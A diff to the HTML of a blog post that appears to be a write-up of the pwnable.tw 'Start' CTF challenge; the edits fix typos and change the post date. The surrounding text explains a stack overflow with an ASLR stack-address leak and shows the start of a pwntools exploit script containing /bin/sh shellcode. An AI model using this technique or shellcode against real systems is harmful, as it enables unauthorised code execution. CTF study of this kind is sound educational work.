@@ -60,7 +60,7 @@
 </div>		<div class="content container">
 <div class="post">
 	<h1 class="post-title">Pwnable.tw Challenge 1 - Start</h1>
-	<span class="post-date">Tue 19 May 2020</span>
+	<span class="post-date">Sat 13 June 2020</span>
 	<p>The first challenge from pwnable.tw, as the name of the site suggests, is a pwnable CTF challenge. The goal of the challenge is to pop a shell in the remote service and read out the flag, which we've been instructed should reside at '/home/start/flag'. The binary running on the remote server is provided for offline analysis and testing. </p>
 <p>As usual, the first step is to run <code>file</code> on the binary:</p>
 <div class="highlight"><pre><span></span><code><span class="gp">$</span> file start
@@ -163,7 +163,7 @@ RelRO                         : ✘
 </code></pre></div>
 
 
-<p>Good news! Stack canaries are not employed in this binary, making a stack-smash much easier. Nor is NX enabled, meaning the stack is executable. In theory, this means that we should be able to overwrite the retrun address of the current stack frame with the address of our shellcode, which can also be included in our input string to the program. The first task is to determine at what offset into our input string will overwrite the return address. We could calculate this manually, but it's easier to use the handy 'pattern generator' functionality of GEF as follows:</p>
+<p>Good news! Stack canaries are not employed in this binary, making a stack-smash much easier. Nor is NX enabled, meaning the stack is executable. In theory, this means that we should be able to overwrite the return address of the current stack frame with the address of our shellcode, which can also be included in our input string to the program. The first task is to determine at what offset into our input string will overwrite the return address. We could calculate this manually, but it's easier to use the handy 'pattern generator' functionality of GEF as follows:</p>
 <div class="highlight"><pre><span></span><code><span class="gp">$</span> gdb start
 <span class="go">...</span>
 <span class="go">gef➤  pattern create 60</span>
@@ -240,7 +240,7 @@ RelRO                         : ✘
 </code></pre></div>
 
 
-<p>Nice! We have succesfully pwned the binary without ASLR. Let's disable ASLR (by chaging the ASLR argument to the process object):</p>
+<p>Nice! We have successfully pwned the binary without ASLR. Let's disable ASLR (by changing the ASLR argument to the process object):</p>
 <div class="highlight"><pre><span></span><code><span class="gp">$</span> python3 start.py 
 <span class="go">[+] Starting local process &#39;./start&#39;: pid 78932</span>
 <span class="go">[*] Switching to interactive mode</span>
@@ -264,7 +264,7 @@ RelRO                         : ✘
 
 <p>No good.. ASLR seems to be enabled on the remote challenge server. In order to properly exploit this binary with ASLR, we'll need to somehow "leak" a stack address. We can then compute the offset between the leaked address and the start of our shellcode, which will remain constant regardless of where the stack is loaded into the process memory space - therefore providing a reliable method to compute the address of our shellcode.</p>
 <p>After poking around the binary a bit in Binary Ninja, I noticed a suspicious <code>push esp</code> instruction at the beginning of the main function. As "luck" would have it, the program only adds 0x14 to the stack in its cleanup postamble - just enough to clean up the 5 pushes for the output string, but not the stack pointer value pushed onto the stack at the start. Also lucky for us, the program moves esp into ecx (address 8048087) just prior to the write system call. For the write call, the string pointer value in ecx will be used for the buffer to be written to stdout. Therefore, if we use the buffer overflow from the read function (address 8048097) to redirect program control to address 8048087, we can force the program to leak a stack address. After the call to write, the program will continue to the vulnerable read function, which we'll exploit for a <em>second</em> time, this time redirecting program control to our shellcode, which through a little experimentation in gdb, I discovered to be the leaked address plus 20.</p>
-<p>The final pwntool sript is as follows:</p>
+<p>The final pwntools script is as follows:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</span><span class="s1">&#39;</span>
